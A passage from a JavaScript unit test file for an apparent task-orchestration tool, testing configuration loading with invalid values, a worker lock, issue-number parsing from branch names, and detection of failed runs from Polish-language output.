    const missing = loadCoordinationSettings({ HOME: root, PIRX_COORDINATION_CONFIG: join(root, "absent.json"), PIRX_ORCHESTRATOR_CONFIG: join(root, "absent-orchestrator.json") });
    assert.doesNotMatch(String(missing.configurationError ?? ""), /coordination\.json/u, "a missing file is fine");
    for (const value of ["0", "-2", "abc", "1.5", ""]) assert.equal(loadCoordinationSettings({ HOME: root, PIRX_COORDINATION_CONFIG: join(root, "absent.json"), PIRX_CAP_WORKER_STARTS: value }).caps.workerStartsPerTaskPerDay, 3, value);
  } finally { await rm(root, { recursive: true, force: true }); }
});

test("worker lock: a second acquire while one is held fails, and release frees it once", async () => {
  const h = await harness();
  try {
    const lock = { task: `${REPO}#1`, pid: process.pid, startedAt: h.store.now(), logPath: "/dev/null", reportPath: "/dev/null" };
    assert.equal(h.store.acquire(lock), true);
    assert.equal(h.store.acquire({ ...lock, task: `${REPO}#2` }), false);
    assert.equal(h.store.lock()?.task, `${REPO}#1`);
    h.store.release();
    assert.equal(h.store.acquire({ ...lock, task: `${REPO}#2` }), true);
  } finally { await h.close(); }
});

test("branch names: zero, leading zeros, suffixes and look-alikes", async () => {
  const { issueOfBranch } = await import("../src/coordination/facts.js");
  assert.equal(issueOfBranch("pirx/issue-0"), undefined, "Issue 0 does not exist");
  assert.equal(issueOfBranch("pirx/issue-007"), 7);
  assert.equal(issueOfBranch("pirx/issue-5x"), undefined);
  assert.equal(issueOfBranch("pirx/issue-"), undefined);
  assert.equal(issueOfBranch("pirx/issue-12/retry"), 12);
  assert.equal(issueOfBranch("xpirx/issue-12"), undefined);
  assert.equal(issueOfBranch("pirx/issue-99999999999999999999"), undefined, "not a safe integer");
});

test("tick outcome: whitespace, the limit message after blank lines, and an exit by signal are failures", async () => {
  const { tickSucceeded } = await import("../src/coordination/tick-cli.js");
  assert.equal(tickSucceeded(0, " \n\t"), false);
  assert.equal(tickSucceeded(0, "\n\nOsiągnięto limit wywołań narzędzi."), false);
  assert.equal(tickSucceeded(null, "Decyzja: nic"), false);
  assert.equal(tickSucceeded(0, "Decyzja: nic. Osiągnięto limit nie dotyczy."), true);
});
